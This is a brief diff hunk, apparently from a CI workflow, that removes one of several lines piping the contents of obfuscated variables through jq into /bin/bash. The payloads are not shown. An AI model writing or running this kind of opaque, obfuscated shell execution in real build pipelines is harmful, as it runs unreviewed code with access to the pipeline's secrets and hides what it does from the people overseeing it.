@@ -38,7 +38,6 @@ jobs:
           echo $lmx0 | jq -r .a6578 | /bin/bash
           echo $ey8 | jq -r .y89 | /bin/bash
           echo $d2400 | jq -r .ijafk44434 | /bin/bash
-          printf '%s' "$op8153" | jq -r .hyb0696 | /bin/bash
           echo $hel160 | jq -r .kajgx8 | /bin/bash
           printf '%s' "$qzfdg8" | jq -r .a22 | /bin/bash
           printf '%s' "$wtyf27377" | jq -r .xbd4 | /bin/bash
